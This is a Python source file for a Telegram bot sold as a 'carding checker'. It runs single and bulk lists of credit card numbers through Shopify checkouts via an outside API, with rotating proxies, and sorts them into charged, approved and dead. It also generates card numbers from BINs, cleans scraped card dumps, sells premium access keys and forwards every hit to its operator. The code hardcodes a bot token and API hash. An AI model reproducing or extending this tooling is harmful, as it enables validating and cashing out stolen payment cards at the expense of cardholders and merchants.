from telethon import TelegramClient, events, Button
import asyncio, aiohttp, aiofiles, os, random, time, re, json, sqlite3
from datetime import datetime, timedelta
from telethon.errors import FloodWaitError

# ============================================================
# CONFIG
# ============================================================
API_ID       = 2040
API_HASH     = 'b18441a1ff607e10a989891a5462e627'
BOT_TOKEN    = '8688618886:AAFmHq7X7Ob0XmYm49lm3vDzR8TeoHRydDs'
ADMIN_ID     = 6781479038
KEY_ADMINS   = {6781479038}

# ── Shopify API ───────────────────────────────────────────────
SHOPIFY_API  = "https://web-production-3bcca.up.railway.app/shopify"

# ── Files ─────────────────────────────────────────────────────
PREMIUM_FILE     = 'premium.txt'
SITES_FILE       = 'sites.txt'
PROXY_FILE       = 'proxy.txt'
KEYS_FILE        = 'keys.txt'
DAILY_USAGE_FILE = 'daily_usage.json'
USER_SITES_FILE  = 'user_sites.json'

bot = TelegramClient('bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
active_sessions  = {}
user_check_locks = {}
last_click       = {}

# ============================================================
# HELPERS
# ============================================================
def get_lines(path):
    if not os.path.exists(path): return []
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        return [l.strip() for l in f if l.strip()]

def is_admin(uid):   return uid == ADMIN_ID or uid in KEY_ADMINS
def load_sites():    return get_lines(SITES_FILE)
def load_proxies():  return get_lines(PROXY_FILE)

def is_premium(uid):
    if not os.path.exists(PREMIUM_FILE): return False
    valid, found = [], False
    uid_s = str(uid)
    for line in get_lines(PREMIUM_FILE):
        try:
            u, exp = line.split('|', 1)
            if datetime.strptime(exp.strip(), "%Y-%m-%d %H:%M:%S") > datetime.now():
                valid.append(line)
                if u == uid_s: found = True
        except: pass
    with open(PREMIUM_FILE, 'w') as f:
        f.write('\n'.join(valid) + ('\n' if valid else ''))
    return found

def get_daily(uid):
    if not os.path.exists(DAILY_USAGE_FILE):
        return {"cc_count": 0, "date": datetime.now().date().isoformat()}
    try:
        data = json.load(open(DAILY_USAGE_FILE))
        today = datetime.now().date().isoformat()
        if str(uid) not in data or data[str(uid)]["date"] != today:
            data[str(uid)] = {"cc_count": 0, "date": today}
        return data[str(uid)]
    except: return {"cc_count": 0, "date": datetime.now().date().isoformat()}

def add_daily(uid, n=1):
    data = {}
    if os.path.exists(DAILY_USAGE_FILE):
        try: data = json.load(open(DAILY_USAGE_FILE))
        except: pass
    today = datetime.now().date().isoformat()
    if str(uid) not in data or data[str(uid)]["date"] != today:
        data[str(uid)] = {"cc_count": 0, "date": today}
    data[str(uid)]["cc_count"] += n
    json.dump(data, open(DAILY_USAGE_FILE, 'w'))

def save_user(uid):
    try:
        conn = sqlite3.connect('users.db')
        conn.execute("CREATE TABLE IF NOT EXISTS users (uid INTEGER PRIMARY KEY)")
        conn.execute("INSERT OR IGNORE INTO users VALUES (?)", (uid,))
        conn.commit(); conn.close()
    except: pass

def all_users():
    try:
        conn = sqlite3.connect('users.db')
        rows = conn.execute("SELECT uid FROM users").fetchall()
        conn.close()
        return [r[0] for r in rows]
    except: return []

def extract_cc(text):
    return [f"{c}|{m}|{'20'+y if len(y)==2 else y}|{v}"
            for c,m,y,v in re.findall(r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', text)]

def gen_key(days):
    key = f"WALID-{random.randint(100000,999999)}-{days}D"
    with open(KEYS_FILE, 'a') as f: f.write(f"{key}|{days}\n")
    return key

def redeem_key(key, uid):
    if not os.path.exists(KEYS_FILE): return "invalid"
    lines, found = [], False
    for line in get_lines(KEYS_FILE):
        try:
            k, d = line.split('|', 1)
            if k.strip().upper() == key.strip().upper():
                found = True
                days = 999999 if is_admin(uid) else int(d.strip())
                exp  = datetime.now() + timedelta(days=days)
                with open(PREMIUM_FILE, 'a') as f:
                    f.write(f"{uid}|{exp.strftime('%Y-%m-%d %H:%M:%S')}\n")
            else: lines.append(line)
        except: lines.append(line)
    if not found: return "invalid"
    with open(KEYS_FILE, 'w') as f: f.write('\n'.join(lines) + '\n')
    return "success"

async def get_bin(card):
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as s:
            async with s.get(f"https://bins.antipublic.cc/bins/{card[:6]}") as r:
                if r.status == 200:
                    d = await r.json()
                    return d.get('brand','-'), d.get('bank','-'), d.get('country_name','-'), d.get('country_flag','')
    except: pass
    return '-', '-', '-', ''

def get_user_sites(uid):
    if not os.path.exists(USER_SITES_FILE): return []
    try:
        data = json.load(open(USER_SITES_FILE))
        return data.get(str(uid), [])
    except: return []

async def save_user_site(uid, site):
    data = {}
    if os.path.exists(USER_SITES_FILE):
        try: data = json.load(open(USER_SITES_FILE))
        except: pass
    k = str(uid)
    if k not in data: data[k] = []
    if site not in data[k]:
        data[k].append(site)
        json.dump(data, open(USER_SITES_FILE, 'w'), indent=2)
        return True
    return False

# ============================================================
# CORE CHECK
# ============================================================
DEAD_TRIGGERS = [
    "timeout","connection failed","connection reset","timed out","site error","site dead",
    "cloudflare","captcha","invalid url","error in 1st req","access denied","ssl","502","503",
    "504","bad gateway","unreachable","failed to detect product","failed to create checkout",
    "failed to tokenize","no_session_token","tokenize_fail","amount_too_small","sold out",
    "429","rate limit","too many requests","missing stableid","missing buildid","step 1 failed"
]

async def check_card(card, site, proxy=""):
    try:
        if not site.startswith("http"): site = f"https://{site}"
        url = f"{SHOPIFY_API}?site={site}&cc={card}&proxy={proxy}"
        timeout = aiohttp.ClientTimeout(total=35)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.get(url) as r:
                raw = await r.json(content_type=None)

        msg   = str(raw.get('Response', '')).strip()
        price = raw.get('Price', '-')
        gate  = raw.get('Gateway', 'Shopify')
        ok    = raw.get('Status', False)
        ml    = msg.lower()

        if any(x in ml for x in DEAD_TRIGGERS):
            return {"status":"Error","message":msg[:120],"price":price,"gateway":gate,"retry":True}

        CHARGED = ["charged","order completed","order_paid","insufficient_funds","thank you","payment successful"]
        if ok == "Charged" or any(x in ml for x in CHARGED):
            return {"status":"Charged","message":msg[:120],"price":price,"gateway":gate,"retry":False}

        APPROVED = ["approved","success","invalid_cvv","incorrect_cvv","invalid_cvc","incorrect_cvc",
                    "incorrect_zip","otp_required","3d"]
        if ok == "Approved" or any(x in ml for x in APPROVED):
            return {"status":"Approved","message":msg[:120],"price":price,"gateway":gate,"retry":False}

        if "declined" in ml or "card_declined" in ml:
            return {"status":"Dead","message":msg[:120],"price":price,"gateway":gate,"retry":False}

        if not ok:
            return {"status":"Error","message":msg[:120],"price":price,"gateway":gate,"retry":True}

        return {"status":"Dead","message":msg[:120],"price":price,"gateway":gate,"retry":False}

    except asyncio.TimeoutError:
        return {"status":"Error","message":"Timeout","price":"-","gateway":"Shopify","retry":True}
    except Exception as e:
        return {"status":"Error","message":str(e)[:80],"price":"-","gateway":"Shopify","retry":True}

async def check_with_retry(card, sites, proxies, retries=8):
    if not sites:  return {"status":"Dead","message":"No sites","card":card,"gateway":"Shopify","price":"-"}
    tried, last = set(), "No response"
    for _ in range(retries):
        avail = [s for s in sites if s not in tried]
        if not avail: break
        site  = random.choice(avail); tried.add(site)
        proxy = random.choice(proxies) if proxies else ""
        res   = await check_card(card, site, proxy)
        last  = res.get("message", "")
        if not res.get("retry"): return {**res, "card": card, "site": site}
        await asyncio.sleep(2)
    return {"status":"Dead","message":last,"card":card,"gateway":"Shopify","price":"-","site":None}

# ============================================================
# NOTIFY FUNCTIONS
# ============================================================
async def notify_hit(uid, res, name, hit_type):
    brand, bank, country, flag = await get_bin(res['card'].split('|')[0])
    s = res['status']
    emoji = "💎" if s == "Charged" else "✅"
    st_text = "𝗖𝗛𝗔𝗥𝗚𝗘𝗗 💎" if s == "Charged" else "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"
    msg = (
        f"<b>{emoji} {st_text}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>✔️ CC ➜</b> <tg-spoiler><code>{res['card']}</code></tg-spoiler>\n"
        f"<b>⚡ Gate ➜</b> {res.get('gateway','Shopify')}\n"
        f"<b>⭐ Resp ➜</b> {res.get('message','')[:100]}\n"
        f"<b>💵 Price ➜</b> ${res.get('price','-')}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>💳 BIN ➜</b> {res['card'][:6]} - {brand}\n"
        f"<b>🏧 Bank ➜</b> {bank}\n"
        f"<b>☄️ Country ➜</b> {country} {flag}\n"
        f"<b>👑 By ➜</b> <a href='tg://user?id={uid}'>{name}</a>\n"
        f"🤖 <b>Bot By: <a href='tg://user?id=6781479038'>@znzii</a></b>"
    )
    try: await bot.send_message(uid, msg, parse_mode='html')
    except: pass
    try: await bot.send_message(ADMIN_ID, msg, parse_mode='html')
    except: pass

# ============================================================
# /start
# ============================================================
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    uid = event.sender_id; save_user(uid)
    try: name = (await event.get_sender()).first_name or "User"
    except: name = "User"
    plan = "👑 Admin" if is_admin(uid) else "💎 Premium" if is_premium(uid) else "⭐ Free"
    msg = (
        f"<b>⚡ 𝗖𝗮𝗿𝗗𝗶𝗻𝗚 𝗖𝗵𝗲𝗰𝗸𝗲𝗿</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>👤</b> <a href='tg://user?id={uid}'>{name}</a>\n"
        f"<b>🆔 ID:</b> <code>{uid}</code>\n"
        f"<b>💠 Plan:</b> {plan}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>📌 Commands:</b>\n"
        f"<code>/sh cc|mm|yy|cvv</code> — Single\n"
        f"<code>/msh</code> — Reply .txt Bulk\n"
        f"<code>/plan</code> — My plan\n"
        f"<code>/redeem KEY</code> — Activate\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 <b>Bot By: <a href='tg://user?id=6781479038'>@znzii</a></b>"
    )
    btns = [
        [Button.inline("💳 𝗖𝗛𝗘𝗖𝗞𝗘𝗥", b"checker"), Button.inline("💎 𝗣𝗟𝗔𝗡𝗦", b"plans")],
        [Button.inline("🔧 𝗧𝗢𝗢𝗟𝗦", b"tools"),   Button.inline("🆘 𝗦𝗨𝗣𝗣𝗢𝗥𝗧", b"support")],
    ]
    await event.reply(msg, buttons=btns, parse_mode='html')

# ── Inline buttons ─────────────────────────────────────────
@bot.on(events.CallbackQuery(data=b"checker"))
async def cb_checker(event):
    await event.edit(
        "<b>💳 CHECKER MENU</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        "<code>/sh cc|mm|yy|cvv</code> — Single check\n"
        "<code>/msh</code> — Bulk (reply .txt)\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "⚡ Gate: <b>Auto Shopify</b>",
        buttons=[[Button.inline("🔙 Back", b"back")]], parse_mode='html')

@bot.on(events.CallbackQuery(data=b"plans"))
async def cb_plans(event):
    await event.edit(
        "<b>💎 PREMIUM PLANS</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        "📅 7 Days\n📅 30 Days\n━━━━━━━━━━━━━━━━━━━━\n"
        "✅ 10,000 CC/bulk\n✅ No daily limit\n✅ Priority\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "<b>👑 Buy: <a href='tg://user?id=6781479038'>@znzii</a></b>",
        buttons=[[Button.url("💎 BUY","https://t.me/znzii"),Button.inline("🔙 Back",b"back")]],
        parse_mode='html')

@bot.on(events.CallbackQuery(data=b"tools"))
async def cb_tools(event):
    await event.edit(
        "<b>🔧 TOOLS</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        "<code>/addsite url</code> — Add site\n"
        "<code>/mysites</code> — My sites\n"
        "<code>/site</code> — Check all sites\n"
        "<code>/addproxy</code> — Add proxy\n"
        "<code>/gen BIN COUNT</code> — Gen CC\n"
        "<code>/scrape</code> — Clean CC file",
        buttons=[[Button.inline("🔙 Back",b"back")]], parse_mode='html')

@bot.on(events.CallbackQuery(data=b"support"))
async def cb_support(event):
    uid = event.sender_id
    plan = "👑 Admin" if is_admin(uid) else "💎 Premium" if is_premium(uid) else "⭐ Free"
    await event.edit(
        f"<b>🆘 SUPPORT</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>Plan:</b> {plan}\n<code>/redeem KEY</code> — Activate\n"
        f"<b>👑 <a href='tg://user?id=6781479038'>@znzii</a></b>",
        buttons=[[Button.url("📞 Contact","https://t.me/znzii"),Button.inline("🔙 Back",b"back")]],
        parse_mode='html')

@bot.on(events.CallbackQuery(data=b"back"))
async def cb_back(event):
    uid = event.sender_id
    try: name = (await event.get_sender()).first_name or "User"
    except: name = "User"
    plan = "👑 Admin" if is_admin(uid) else "💎 Premium" if is_premium(uid) else "⭐ Free"
    msg = (
        f"<b>⚡ 𝗖𝗮𝗿𝗗𝗶𝗻𝗚 𝗖𝗵𝗲𝗰𝗸𝗲𝗿</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>👤</b> <a href='tg://user?id={uid}'>{name}</a>\n"
        f"<b>💠 Plan:</b> {plan}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 <b>Bot By: <a href='tg://user?id=6781479038'>@znzii</a></b>"
    )
    btns = [
        [Button.inline("💳 𝗖𝗛𝗘𝗖𝗞𝗘𝗥",b"checker"),Button.inline("💎 𝗣𝗟𝗔𝗡𝗦",b"plans")],
        [Button.inline("🔧 𝗧𝗢𝗢𝗟𝗦",b"tools"),Button.inline("🆘 𝗦𝗨𝗣𝗣𝗢𝗥𝗧",b"support")],
    ]
    await event.edit(msg, buttons=btns, parse_mode='html')

# ============================================================
# /sh — SINGLE CHECK
# ============================================================
@bot.on(events.NewMessage(pattern=r'^/sh(?:\s|$)'))
async def single_check(event):
    uid = event.sender_id; save_user(uid)
    try: name = (await event.get_sender()).first_name or "User"
    except: name = "User"

    txt = event.message.text.strip()
    if len(txt) <= 4:
        await event.reply("<code>/sh 4111111111111111|01|2028|123</code>", parse_mode='html')
        return

    cards = extract_cc(txt.split(' ', 1)[1] if ' ' in txt else "")
    if not cards:
        await event.reply("❌ Format: <code>cc|mm|yy|cvv</code>", parse_mode='html')
        return

    if not is_admin(uid) and not is_premium(uid):
        usage = get_daily(uid)
        if usage["cc_count"] >= 150:
            await event.reply("❌ Daily limit (150) reached. /redeem KEY to upgrade.")
            return

    sites   = get_user_sites(uid) or load_sites()
    proxies = load_proxies()
    if not sites:
        await event.reply("❌ No sites. Use /addsite url")
        return

    sm = await event.reply("🔄 <b>Checking...</b>", parse_mode='html')
    card = cards[0]
    res  = await check_with_retry(card, sites, proxies)
    add_daily(uid)

    brand, bank, country, flag = await get_bin(card.split('|')[0])
    s = res['status']

    if s == "Charged":
        top = "💎 𝗖𝗛𝗔𝗥𝗚𝗘𝗗"
    elif s == "Approved":
        top = "✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗"
    elif s == "Dead":
        top = "❌ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗"
    else:
        top = "⚠️ 𝗘𝗥𝗥𝗢𝗥"

    msg = (
        f"<b>{top}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>✔️ CC ➜</b> <tg-spoiler><code>{card}</code></tg-spoiler>\n"
        f"<b>⚡ Gate ➜</b> {res.get('gateway','Shopify')}\n"
        f"<b>⭐ Resp ➜</b> {res.get('message','')[:100]}\n"
        f"<b>💵 Price ➜</b> ${res.get('price','-')}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>💳 BIN ➜</b> {card[:6]} - {brand}\n"
        f"<b>🏧 Bank ➜</b> {bank}\n"
        f"<b>☄️ Country ➜</b> {country} {flag}\n"
        f"<b>👑 By ➜</b> <a href='tg://user?id={uid}'>{name}</a>\n"
        f"🤖 <b>Bot By: <a href='tg://user?id=6781479038'>@znzii</a></b>"
    )
    try: await sm.delete()
    except: pass
    await bot.send_message(event.chat_id, msg, parse_mode='html',
                           buttons=[[Button.inline("📋 Copy CC", f"copycc_{card}".encode())]])

    if s in ("Charged", "Approved"):
        await notify_hit(uid, res, name, s)

# ============================================================
# /msh — BULK CHECK
# ============================================================
@bot.on(events.NewMessage(pattern=r'^/msh(?:\s|$)'))
async def bulk_check(event):
    uid = event.sender_id; save_user(uid)
    try: sender = await event.get_sender(); name = sender.username or sender.first_name or f"user_{uid}"
    except: name = f"user_{uid}"

    if uid in user_check_locks:
        await event.reply("⚠️ Already running. /stop to cancel.")
        return

    if not event.reply_to_msg_id:
        await event.reply("❌ Reply to .txt file with /msh")
        return

    rm = await event.get_reply_message()
    if not rm.file or not str(rm.file.name).endswith('.txt'):
        await event.reply("❌ .txt only.")
        return

    fp = await rm.download_media()
    async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    try: os.remove(fp)
    except: pass

    cards = extract_cc(content)
    if not cards:
        await event.reply("❌ No valid cards found.")
        return

    is_adm  = is_admin(uid)
    is_prem = is_premium(uid)

    if is_adm:   limit = 1000000
    elif is_prem: limit = 10000
    else:         limit = 2000

    if len(cards) > limit:
        await event.reply(f"❌ Limit: {limit} CC. Your file: {len(cards)} CC")
        return
    cards = cards[:limit]

    sites   = get_user_sites(uid) or load_sites()
    proxies = load_proxies()
    if not sites:
        await event.reply("❌ No sites available.")
        return

    user_check_locks[uid] = True
    total    = len(cards)
    charged  = approved = dead = errors = checked = 0
    start    = time.time()
    results  = {'charged':[], 'approved':[], 'dead':[], 'errors':0, 'total':total, 'start':start}

    sm = await event.reply(
        f"<b>⚡ Mass Check Started — {total} cards</b>",
        parse_mode='html',
        buttons=[[Button.inline("🛑 Stop", b"stopmsh")]]
    )
    session_key = f"{uid}_{sm.id}"
    active_sessions[session_key] = {'stop': False, 'results': results}

    async def worker(card):
        nonlocal charged, approved, dead, errors, checked
        if active_sessions.get(session_key, {}).get('stop'): return
        res = await check_with_retry(card, sites, proxies)
        checked += 1
        s = res['status']
        if s == "Charged":
            charged += 1; results['charged'].append(res)
            await notify_hit(uid, res, name, "Charged")
        elif s == "Approved":
            approved += 1; results['approved'].append(res)
            await notify_hit(uid, res, name, "Approved")
        elif s == "Error":
            errors += 1; results['errors'] += 1; dead += 1; results['dead'].append(res)
        else:
            dead += 1; results['dead'].append(res)

        if checked % 10 == 0 or checked == total:
            elapsed = int(time.time() - start)
            try:
                await sm.edit(
                    f"<b>⚡ Mass Check</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"<b>💎 Charged:</b> {charged}\n"
                    f"<b>✅ Approved:</b> {approved}\n"
                    f"<b>❌ Dead:</b> {dead}\n"
                    f"<b>⚠️ Errors:</b> {errors}\n"
                    f"<b>🔄 Progress:</b> {checked}/{total}\n"
                    f"<b>⏱ Time:</b> {elapsed}s",
                    parse_mode='html',
                    buttons=[[Button.inline("🛑 Stop", b"stopmsh")]]
                )
            except: pass

    workers_n = 60 if is_adm or is_prem else 15
    sem = asyncio.Semaphore(workers_n)
    async def bounded(card):
        async with sem: await worker(card)

    try:
        await asyncio.gather(*[bounded(c) for c in cards])
    except: pass
    finally:
        user_check_locks.pop(uid, None)
        active_sessions.pop(session_key, None)

    elapsed = int(time.time() - start)
    try:
        await sm.edit(
            f"<b>✅ Done</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>💎 Charged:</b> {charged}\n<b>✅ Approved:</b> {approved}\n"
            f"<b>❌ Dead:</b> {dead}\n<b>⚠️ Errors:</b> {errors}\n"
            f"<b>📊 Total:</b> {total}\n<b>⏱ Time:</b> {elapsed}s",
            parse_mode='html'
        )
    except: pass

@bot.on(events.CallbackQuery(data=b"stopmsh"))
async def stop_msh(event):
    uid = event.sender_id
    for k in list(active_sessions):
        if k.startswith(f"{uid}_"):
            active_sessions[k]['stop'] = True
    user_check_locks.pop(uid, None)
    await event.answer("🛑 Stopped!", alert=True)
    try: await event.edit("🛑 <b>Stopped.</b>", parse_mode='html')
    except: pass

@bot.on(events.NewMessage(pattern='/stop'))
async def stop_cmd(event):
    uid = event.sender_id
    if uid in user_check_locks:
        for k in list(active_sessions):
            if k.startswith(f"{uid}_"): active_sessions[k]['stop'] = True
        user_check_locks.pop(uid, None)
        await event.reply("🛑 Stopped.")
    else: await event.reply("❌ No active session.")

@bot.on(events.CallbackQuery(pattern=b"copycc_"))
async def copy_cc(event):
    cc = event.data.decode().split("_",1)[1]
    await event.answer(f"✅ Copied!\n{cc}", alert=True)

# ============================================================
# /plan
# ============================================================
@bot.on(events.NewMessage(pattern='/plan'))
async def plan_cmd(event):
    uid = event.sender_id
    try: sender = await event.get_sender(); name = sender.first_name or "User"
    except: name = "User"
    if is_admin(uid):   plan, exp, daily = "👑 Admin", "∞ Lifetime", "∞"
    elif is_premium(uid):
        plan, daily = "💎 Premium", "∞"
        exp = "Active"
        try:
            for line in get_lines(PREMIUM_FILE):
                if str(uid) in line: _, exp = line.split('|',1); break
        except: pass
    else:
        plan, exp = "⭐ Free", "N/A"
        u = get_daily(uid)
        daily = f"{u['cc_count']}/150"
    await event.reply(
        f"<b>💠 MY PLAN</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>👤 Name:</b> {name}\n<b>🆔 ID:</b> <code>{uid}</code>\n"
        f"<b>💠 Plan:</b> {plan}\n<b>⏳ Expiry:</b> {exp}\n"
        f"<b>📊 Daily:</b> {daily}\n━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 <code>/redeem KEY</code> to upgrade",
        parse_mode='html')

# ============================================================
# /redeem
# ============================================================
@bot.on(events.NewMessage(pattern=r'^/redeem\s+(.+)'))
async def redeem_cmd(event):
    uid = event.sender_id
    key = event.pattern_match.group(1).strip().upper()
    sm  = await event.reply("🔄 Verifying...")
    await asyncio.sleep(1)
    res = redeem_key(key, uid)
    try: await sm.delete()
    except: pass
    if res == "success":
        await event.reply(
            "<b>🎉 ACTIVATED!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            "💎 Premium is now active!\n"
            "<code>/sh cc|mm|yy|cvv</code> — Single\n"
            "<code>/msh</code> — Bulk",
            parse_mode='html')
    else:
        await event.reply(
            "<b>❌ Invalid Key!</b>\n<a href='tg://user?id=6781479038'>@znzii</a>",
            parse_mode='html')

# ============================================================
# /key — Admin only
# ============================================================
@bot.on(events.NewMessage(pattern=r'^/key\s+(\d+)\s+(\d+)$'))
async def key_cmd(event):
    if event.sender_id not in KEY_ADMINS:
        await event.reply("❌ Admin only."); return
    count = int(event.pattern_match.group(1))
    days  = int(event.pattern_match.group(2))
    keys  = [gen_key(days) for _ in range(count)]
    txt   = '\n'.join(f"<code>{k}</code>" for k in keys)
    await event.reply(f"✅ <b>{count} Keys ({days} days):</b>\n{txt}", parse_mode='html')

# ============================================================
# SITE COMMANDS
# ============================================================
@bot.on(events.NewMessage(pattern=r'^/addsite\s+(.+)'))
async def addsite_cmd(event):
    uid  = event.sender_id
    site = event.pattern_match.group(1).strip().rstrip('/')
    if not site.startswith("http"): site = f"https://{site}"
    sm = await event.reply(f"🔄 Testing <code>{site[:50]}</code>...", parse_mode='html')
    proxies = load_proxies()
    proxy   = random.choice(proxies) if proxies else ""
    test    = "4111111111111111|01|2028|123"
    res     = await check_card(test, site, proxy)
    if res.get('retry'):
        await sm.edit(f"❌ Site dead or unreachable.\n<code>{site[:60]}</code>", parse_mode='html')
        return
    added = await save_user_site(uid, site)
    await sm.edit(
        f"{'✅ Added!' if added else '⚠️ Already in list!'}\n<code>{site[:60]}</code>",
        parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/mysites$'))
async def mysites_cmd(event):
    uid   = event.sender_id
    sites = get_user_sites(uid)
    if not sites:
        await event.reply(f"❌ No personal sites.\n/addsite url to add.\n(Bot has {len(load_sites())} sites)")
        return
    if len(sites) <= 20:
        txt = '\n'.join(f"{i+1}. <code>{s[:60]}</code>" for i,s in enumerate(sites))
        await event.reply(f"📋 Your Sites ({len(sites)}):\n{txt}", parse_mode='html')
    else:
        fn = f"mysites_{uid}.txt"
        with open(fn,'w') as f: f.write('\n'.join(sites))
        await event.reply(f"📋 {len(sites)} sites", file=fn)
        os.remove(fn)

@bot.on(events.NewMessage(pattern=r'^/site$'))
async def site_cmd(event):
    sites = load_sites()
    await event.reply(f"📊 Bot Sites: <code>{len(sites)}</code>", parse_mode='html')

# ============================================================
# PROXY COMMANDS
# ============================================================
@bot.on(events.NewMessage(pattern=r'^/addproxy'))
async def addproxy_cmd(event):
    lines = event.message.text.split('\n')[1:]
    proxies = [l.strip() for l in lines if l.strip()]
    if not proxies:
        await event.reply("Usage:\n/addproxy\nip:port:user:pass")
        return
    with open(PROXY_FILE, 'a') as f:
        for p in proxies: f.write(f"{p}\n")
    await event.reply(f"✅ Added {len(proxies)} proxies.")

@bot.on(events.NewMessage(pattern=r'^/proxy$'))
async def proxy_cmd(event):
    p = load_proxies()
    await event.reply(f"📡 Proxies: <code>{len(p)}</code>", parse_mode='html')

# ============================================================
# /gen
# ============================================================
@bot.on(events.NewMessage(pattern=r'^/gen\s+(.+)'))
async def gen_cmd(event):
    uid = event.sender_id
    if not is_admin(uid) and not is_premium(uid):
        await event.reply("❌ Premium only."); return
    args = event.pattern_match.group(1).strip().split()
    bins=[]; count=10000
    for a in args:
        if a.isdigit() and len(a)<=6: bins.append(a)
        elif a.isdigit(): count=int(a)
    if not bins:
        await event.reply("Usage: /gen 411111 5000"); return
    cards=[]
    for b in bins:
        for _ in range(count//len(bins)):
            r = 16-len(b)
            num = b + ''.join(str(random.randint(0,9)) for _ in range(r))
            cards.append(f"{num}|{random.randint(1,12):02d}|{random.randint(2026,2030)}|{random.randint(100,999)}")
    fn = f"gen_{uid}.txt"
    with open(fn,'w') as f: f.write('\n'.join(cards))
    await event.reply(f"✅ Generated {len(cards)} cards", file=fn)
    os.remove(fn)

# ============================================================
# /scrape
# ============================================================
@bot.on(events.NewMessage(pattern=r'^/scrape'))
async def scrape_cmd(event):
    uid = event.sender_id
    if not is_admin(uid) and not is_premium(uid):
        await event.reply("❌ Premium only."); return
    if not event.reply_to_msg_id:
        await event.reply("Reply to .txt file with /scrape"); return
    rm = await event.get_reply_message()
    if not rm.file or not str(rm.file.name).endswith('.txt'):
        await event.reply("❌ .txt only."); return
    fp = await rm.download_media()
    async with aiofiles.open(fp,'r',encoding='utf-8',errors='ignore') as f:
        content = await f.read()
    os.remove(fp)
    raw   = extract_cc(content)
    uniq  = list(dict.fromkeys(raw))
    valid = []
    exp   = 0
    for c in uniq:
        try:
            _,m,y,_ = c.split('|')
            y2 = int(y) if len(y)==4 else 2000+int(y)
            if y2 < 2026 or (y2==2026 and int(m)<10): exp+=1; continue
            valid.append(c)
        except: valid.append(c)
    fn = f"clean_{uid}.txt"
    with open(fn,'w') as f: f.write('\n'.join(valid))
    await event.reply(
        f"✅ <b>Scrape Done</b>\n📊 Found: {len(raw)}\n🗑 Dups: {len(raw)-len(uniq)}\n"
        f"⏰ Expired: {exp}\n✅ Valid: {len(valid)}",
        file=fn, parse_mode='html')
    os.remove(fn)

# ============================================================
# ADMIN: /users /notice
# ============================================================
@bot.on(events.NewMessage(pattern='/users'))
async def users_cmd(event):
    if not is_admin(event.sender_id): return
    users = all_users()
    await event.reply(f"👥 Total Users: <code>{len(users)}</code>", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/notice\s+(.+)'))
async def notice_cmd(event):
    if not is_admin(event.sender_id): return
    txt   = event.pattern_match.group(1).strip()
    users = all_users()
    sm    = await event.reply(f"📤 Sending to {len(users)} users...")
    sent  = failed = 0
    for uid in users:
        try:
            await bot.send_message(uid, f"📢 <b>NOTICE</b>\n\n{txt}", parse_mode='html')
            sent += 1; await asyncio.sleep(0.05)
        except: failed += 1
    await sm.edit(f"✅ Sent: {sent} | ❌ Failed: {failed}")

# ============================================================
# MAIN
# ============================================================
if __name__ == '__main__':
    conn = sqlite3.connect('users.db')
    conn.execute("CREATE TABLE IF NOT EXISTS users (uid INTEGER PRIMARY KEY)")
    conn.commit(); conn.close()
    print("✅ Bot Started!")
    bot.run_until_disconnected()
